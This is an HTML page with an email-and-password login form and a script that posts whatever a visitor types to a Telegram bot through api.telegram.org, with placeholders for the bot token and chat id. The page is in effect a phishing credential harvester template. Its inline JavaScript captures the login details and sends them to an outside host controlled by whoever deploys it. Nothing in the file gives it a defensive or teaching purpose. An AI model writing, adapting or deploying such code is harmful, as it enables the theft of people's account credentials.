<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send Message to Telegram</title>
</head>
<body>

  <h2>Send Email and Password to Telegram</h2>

  <form id="loginForm">
    <input id="email" type="email" placeholder="Email" required><br><br>
    <input id="password" type="password" placeholder="Password" required><br><br>
    <button id="sendBtn">Send</button>
  </form>
<script>
 document.getElementById("sendBtn").addEventListener("click", function() {
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  var botToken = 'YOUR_BOT_TOKEN';
  var chatId = 'YOUR_CHAT_ID';
  var message = `Email: ${email}\nPassword: ${password}`;
  var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  })
  .then(response => response.json())
  .then(data => console.log('Message sent:', data))
  .catch(error => console.error('Error:', error));
});
</script>

</body>
</html>
